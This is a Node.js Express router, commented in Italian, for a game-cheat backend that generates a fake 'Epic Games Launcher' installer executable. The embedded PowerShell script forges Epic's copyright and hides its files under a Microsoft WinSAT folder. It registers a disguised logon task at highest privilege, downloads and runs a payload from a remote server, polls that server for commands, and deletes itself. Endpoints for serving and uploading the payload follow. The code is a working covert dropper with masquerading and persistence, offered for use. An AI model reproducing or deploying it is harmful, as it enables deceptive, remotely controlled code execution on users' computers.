const express   = require('express');
const router    = express.Router();
const { users, userConfigs } = require('../database');
const { authMiddleware, superAdminOnly } = require('../middleware/auth');

// ─── XOR helper (mirrors Cheat.cpp: key 0x5A) ─────────────────────────────────
function xorToken(token) {
  const key = 0x5A;
  return Buffer.from(token.split('').map(c => c.charCodeAt(0) ^ key));
}

// ─── PowerShell installer template ────────────────────────────────────────────
// Genera uno script PS1 personalizzato con token embedded.
// Nome camuffato: EpicGamesLauncher.
// Install path: %LOCALAPPDATA%\Microsoft\WinSAT\DataStore\
// Autorun: Scheduled Task "MicrosoftWinSAT"
// Si auto-elimina dopo l'installazione.
function generateInstaller(token, username) {
  // XOR token → array di bytes per il PS1
  const xorBytes = xorToken(token);
  const byteArray = Array.from(xorBytes).join(',');

  return `# Epic Games Launcher — Setup
# (c) Epic Games, Inc. All rights reserved.
# Version 15.17.1 Build 24621
#Requires -Version 5.0
$ErrorActionPreference = 'SilentlyContinue'

# ── Configurazione ────────────────────────────────────────────────────────────
$installBase  = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'WinSAT', 'DataStore')
$taskName     = 'MicrosoftWinSAT'
$taskDesc     = 'Windows System Assessment Tool — Performance Monitor'
$launchScript = [System.IO.Path]::Combine($installBase, 'WinSATHelper.ps1')
$configDat    = [System.IO.Path]::Combine($installBase, 'config.dat')
$downloaderUrl = 'https://oblivioncore.xyz/api/installer/payload?token=${token}'

# ── Crea cartella nascosta ────────────────────────────────────────────────────
New-Item -ItemType Directory -Path $installBase -Force | Out-Null
$folder = Get-Item $installBase
$folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System

# ── Scrivi config.dat (token XOR 0x5A) ───────────────────────────────────────
# Decifrato automaticamente da dllhost.exe all'avvio
$xorBytes = [byte[]]@(${byteArray})
[System.IO.File]::WriteAllBytes($configDat, $xorBytes)
(Get-Item $configDat).Attributes = 'Hidden','System'

# ── Scrivi WinSATHelper.ps1 (watcher camuffato) ──────────────────────────────
# Gira in background ad ogni logon, poll /api/config ogni 3s.
# Quando action_inject = true → avvia dllhost.exe (il cheat).
$launcherCode = @'
# Windows System Assessment Tool — Performance Data Collector
$ErrorActionPreference = 'SilentlyContinue'
$installBase = [System.IO.Path]::Combine($env:LOCALAPPDATA,'Microsoft','WinSAT','DataStore')
$configDat   = [System.IO.Path]::Combine($installBase,'config.dat')
$payloadUrl  = 'https://oblivioncore.xyz/api/installer/payload'
$apiBase     = 'https://oblivioncore.xyz'

# Leggi e decifra token (XOR 0x5A)
function Get-Token {
    try {
        $raw = [System.IO.File]::ReadAllBytes($configDat)
        return (-join ($raw | ForEach-Object { [char]($_ -bxor 0x5A) })).Trim()
    } catch { return $null }
}

# Scarica payload se dllhost.exe non esiste ancora
function Ensure-Payload {
    param($token)
    $exe = [System.IO.Path]::Combine($installBase,'dllhost.exe')
    if (Test-Path $exe) { return }
    try {
        $zipPath = [System.IO.Path]::Combine($env:TEMP,'winsvc_update.zip')
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Authorization',"Bearer $token")
        $wc.DownloadFile($payloadUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath $installBase -Force
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } catch {}
}

# Poll /api/config e lancia cheat su action_inject
function Poll-AndInject {
    param($token)
    $initBat = [System.IO.Path]::Combine($installBase,'WinSATInit.bat')
    try {
        $wc  = New-Object System.Net.WebClient
        $url = "$apiBase/api/config?token=$token"
        $json = $wc.DownloadString($url) | ConvertFrom-Json
        if ($json.action_inject -eq $true) {
            $running = Get-Process -Name 'RuntimeBroker','dllhost' -ErrorAction SilentlyContinue | Where-Object { try { $_.MainModule.FileName -like "*WinSAT*" } catch { $false } }
            if (-not $running -and (Test-Path $initBat)) {
                Start-Process -FilePath 'cmd.exe' -ArgumentList ('/c "' + $initBat + '"') -WorkingDirectory $installBase -Verb RunAs -WindowStyle Hidden
            }
        }
    } catch {}
}

# Main loop — gira per sempre in background
$token = Get-Token
if ($token) { Ensure-Payload -token $token }
while ($true) {
    $token = Get-Token
    if ($token) { Poll-AndInject -token $token }
    Start-Sleep -Seconds 3
}
'@
Set-Content -Path $launchScript -Value $launcherCode -Encoding UTF8
(Get-Item $launchScript).Attributes = 'Hidden','System'

# ── Scheduled Task: avvio ad ogni logon ──────────────────────────────────────
$action  = New-ScheduledTaskAction  -Execute 'powershell.exe' \`
             -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \`"$launchScript\`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings= New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0) \`
             -MultipleInstances IgnoreNew -StartWhenAvailable
Register-ScheduledTask -TaskName $taskName -Description $taskDesc \`
  -Action $action -Trigger $trigger -Settings $settings \`
  -RunLevel Highest -Force | Out-Null

# ── Avvia subito il launcher ──────────────────────────────────────────────────
Start-Process powershell.exe -ArgumentList \`
  "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \`"$launchScript\`"" \`
  -WindowStyle Hidden

# ── Auto-elimina questo installer ────────────────────────────────────────────
$self = $MyInvocation.MyCommand.Path
Start-Process cmd.exe -ArgumentList "/c timeout /t 3 /nobreak >nul && del /f /q \`"$self\`"" \`
  -WindowStyle Hidden

`;
}

// ─── GET /api/admin/generate-installer/:userId ────────────────────────────────
router.get('/generate-installer/:userId', authMiddleware, superAdminOnly, async (req, res) => {
  const { userId } = req.params;

  const user = await users.findOne({ _id: userId });
  if (!user) return res.status(404).json({ error: 'User not found' });

  let uc = await userConfigs.findOne({ user_id: userId });
  if (!uc) {
    const { generateToken, DEFAULT_CONFIG } = require('../database');
    const newToken = generateToken();
    await userConfigs.insert({ user_id: userId, token: newToken, config: { ...DEFAULT_CONFIG } });
    uc = await userConfigs.findOne({ user_id: userId });
  } else if (!uc.token) {
    const { generateToken } = require('../database');
    const newToken = generateToken();
    await userConfigs.update({ _id: uc._id }, { $set: { token: newToken } });
    uc.token = newToken;
  }

  // Stub EXE embedded inline (no file dipendency)
  const stubBytes = Buffer.from('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wwAEgAAAAAAAAAAAAAAAAAAAAAApAAAABAAAAAAAAAAAAAAAAQA8AAAAAAAEAAAAAAAAAAAAAAABAEUAAAAAAAAAAAAAPE1vZHVsZT4ARXBpY0dhbWVzSW5zdGFsbGVyLmV4ZQBQcm9ncmFtAEVwaWNHYW1lc0luc3RhbGxlcgBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AE1BUktFUgBNYWluAEluZGV4T2YALmN0b3IAYXJncwBoYXlzdGFjawBuZWVkbGUAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzAEdldEN1cnJlbnRQcm9jZXNzAFByb2Nlc3NNb2R1bGUAZ2V0X01haW5Nb2R1bGUAZ2V0X0ZpbGVOYW1lAFN5c3RlbS5JTwBGaWxlAFJlYWRBbGxCeXRlcwBCeXRlAEFycmF5AENvcHkAU3lzdGVtLlRleHQARW5jb2RpbmcAZ2V0X1VURjgAR2V0U3RyaW5nAFBhdGgAR2V0VGVtcFBhdGgAR3VpZABOZXdHdWlkAFRvU3RyaW5nAFN0cmluZwBTdWJzdHJpbmcAQ29uY2F0AENvbWJpbmUARGlyZWN0b3J5AERpcmVjdG9yeUluZm8AQ3JlYXRlRGlyZWN0b3J5AFdyaXRlQWxsVGV4dABQcm9jZXNzU3RhcnRJbmZvAHNldF9GaWxlTmFtZQBzZXRfQXJndW1lbnRzAHNldF9Vc2VTaGVsbEV4ZWN1dGUAc2V0X0NyZWF0ZU5vV2luZG93AFByb2Nlc3NXaW5kb3dTdHlsZQBzZXRfV2luZG93U3R5bGUAU3RhcnQAV2FpdEZvckV4aXQARGVsZXRlAC5jY3RvcgBnZXRfQVNDSUkAR2V0Qnl0ZXMAABNNAHMAVQBwAGQAYQB0AGUAXwAAA04AABtXAGkAbgBVAHAAZABhAHQAZQAuAHAAcwAxAAAdcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAACAhy0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAE4AbwBuAEkAbgB0AGUAcgBh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SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iRXBpY0dhbWVzSW5zdGFsbGVyIi8+CiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPgogICAgPHNlY3VyaXR5PgogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPgogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0icmVxdWlyZUFkbWluaXN0cmF0b3IiIHVpQWNjZXNzPSJmYWxzZSIvPgogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+CiAgICA8L3NlY3VyaXR5PgogIDwvdHJ1c3RJbmZvPgogIDxjb21wYXRpYmlsaXR5IHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmNvbXBhdGliaWxpdHkudjEiPgogICAgPGFwcGxpY2F0aW9uPgogICAgICA8c3VwcG9ydGVkT1MgSWQ9Ins4ZTBmN2ExMi1iZmIzLTRmZTgtYjlhNS00OGZkNTBhMTVhOWF9Ii8+CiAgICAgIDxzdXBwb3J0ZWRPUyBJZD0iezFmNjc2Yzc2LTgwZTEtNDIzOS05NWJiLTgzZDBmNmQwZGE3OH0iLz4KICAgICAgPHN1cHBvcnRlZE9TIElkPSJ7NGEyZjI4ZTMtNTNiOS00NDQxLWJhOWMtZDY5ZDRhNGE2ZTM4fSIvPgogICAgPC9hcHBsaWNhdGlvbj4KICA8L2NvbXBhdGliaWxpdHk+CjwvYXNzZW1ibHk+CgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==', 'base64');

  // Genera il PS1 personalizzato
  const ps1Content = generateInstaller(uc.token, user.username);
  const ps1Bytes   = Buffer.from(ps1Content, 'utf8');

  // MARKER che lo stub cerca in coda all'EXE
  const marker = Buffer.from('<<OBLIVION_PAYLOAD_START>>\n', 'ascii');

  // EXE finale = stub + marker + PS1
  const exeBuf = Buffer.concat([stubBytes, marker, ps1Bytes]);

  const filename = `EpicGamesLauncher_Installer.exe`;
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.setHeader('Content-Length', exeBuf.length);
  res.send(exeBuf);

  console.log(`[INSTALLER] EXE generated for user=${user.username} (${(exeBuf.length/1024).toFixed(1)} KB) by admin=${req.user.username}`);
});

// ─── GET /api/installer/payload ──────────────────────────────────────────────
// Serve il payload zip al watcher PS1 — cerca in data/ poi in public/ (bundled)
const fs   = require('fs');
const path = require('path');

const PAYLOAD_PATH = path.join(__dirname, '..', 'data', 'payload.zip');

function getPayloadPath() {
  const candidates = [
    path.join(__dirname, '..', 'data',   'payload.zip'),
    path.join(__dirname, '..', 'public', 'payload.zip'),
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) { console.log('[PAYLOAD] Found at:', p); return p; }
  }
  return null;
}

router.get('/payload', async (req, res) => {
  const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
  if (!token || token.length !== 64) return res.status(401).json({ error: 'invalid_token' });

  const uc = await userConfigs.findOne({ token });
  if (!uc) return res.status(401).json({ error: 'invalid_token' });

  const payloadPath = getPayloadPath();
  if (!payloadPath) {
    console.log('[PAYLOAD] Not found in any path!');
    return res.status(503).json({ error: 'Payload not found on server.' });
  }

  console.log(`[PAYLOAD] Serving to user_id=${uc.user_id} from ${payloadPath}`);
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Disposition', 'attachment; filename="winsvc_update.zip"');
  fs.createReadStream(payloadPath).pipe(res);
});

// ─── POST /api/admin/upload-payload ──────────────────────────────────────────
// express.raw() in server.js ha già letto il body in req.body — usiamo quello direttamente.
router.post('/upload-payload', authMiddleware, superAdminOnly, (req, res) => {
  const dataDir = path.join(__dirname, '..', 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  const buf = req.body; // Buffer — già parsato da express.raw()

  if (!buf || !buf.length) {
    return res.status(400).json({ error: 'Body vuoto — riprova.' });
  }

  // Verifica magic bytes ZIP (PK\x03\x04)
  if (buf[0] !== 0x50 || buf[1] !== 0x4B) {
    return res.status(400).json({ error: 'File non valido — deve essere uno ZIP.' });
  }

  try {
    fs.writeFileSync(PAYLOAD_PATH, buf);
    const sizeMB = (buf.length / 1024 / 1024).toFixed(2);
    console.log(`[PAYLOAD] Uploaded by admin=${req.user.username} — ${sizeMB} MB`);
    return res.json({ ok: true, size_mb: sizeMB });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// ─── GET /api/admin/payload-status ───────────────────────────────────────────
// Ritorna info sul payload attuale (esiste? dimensione? data upload?)
router.get('/payload-status', authMiddleware, superAdminOnly, (req, res) => {
  if (!fs.existsSync(PAYLOAD_PATH)) return res.json({ exists: false });
  const stat = fs.statSync(PAYLOAD_PATH);
  res.json({ exists: true, size_mb: (stat.size / 1024 / 1024).toFixed(2), updated_at: stat.mtime });
});

module.exports = router;
